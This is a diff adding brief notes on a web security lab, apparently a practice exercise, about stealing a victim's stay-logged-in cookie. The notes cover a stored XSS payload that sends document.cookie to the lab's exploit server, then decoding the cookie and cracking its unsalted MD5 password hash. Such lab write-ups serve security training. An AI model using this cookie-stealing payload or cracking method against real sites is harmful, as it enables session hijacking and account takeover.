@@ -1,0 +1,6 @@
+Offline password cracking
+
+in this lab we want to delete the user carlos by logging in his account but only wieniers username and pass was given but 1. the website uses rememberme by storing base64(username:md5(pass)) so check that this works with the decoder 2. the comment section has XSS vulnerability to check just type alert(3-1) and when the page renders it executes. 3. there is an exploit server which is yours and can check the logs, also its url is in there for you to use. 
+using these infos use the exploit serverurl and put it in a script <script>document.location='https://exploit-0aed0083046d55d680bb34d9018c003b.exploit-server.net/' + document.cookie</script> then this will execute everytime someonerenders the page it will also log that into your exploit server
+youll get the cookie there, encode base64, get the hash and search it in crackstation because it isnt salted and easy to decode, youll get the pass for carlos
+
